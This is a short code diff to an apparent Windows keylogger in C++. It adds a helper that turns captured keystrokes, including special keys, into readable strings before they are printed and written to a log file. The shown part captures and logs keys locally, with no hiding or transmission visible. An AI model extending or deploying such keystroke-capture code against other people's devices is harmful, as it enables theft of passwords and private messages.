@@ -4,6 +4,8 @@
 
 #define ITERATION_DELAY 120
 
+std::string formatPrintable(keyStroke key);
+
 logManager* logManager::manager = NULL;
 
 int main()
@@ -18,9 +20,21 @@ int main()
     while(TRUE)
     {
         key = keyLogger::checkPressedKey();
-        std::cout << key.getKeyCharacter();
-        manager->writeCharToLog(key.getKeyCharacter());
+        std::cout << formatPrintable(key);
+        manager->writeCharToLog(formatPrintable(key));
         Sleep(ITERATION_DELAY); 
     }
 	return 0;
+}
+
+std::string formatPrintable(keyStroke key)
+{
+    std::string printString = "";
+
+    if (key.isPrintable())
+        printString = key.getPrintableCharacter();
+    else if (key.getKeyCode() != 0)
+        printString = keyProcessor::convertSpecialChar(key.getKeyCode());
+
+    return printString;
 }
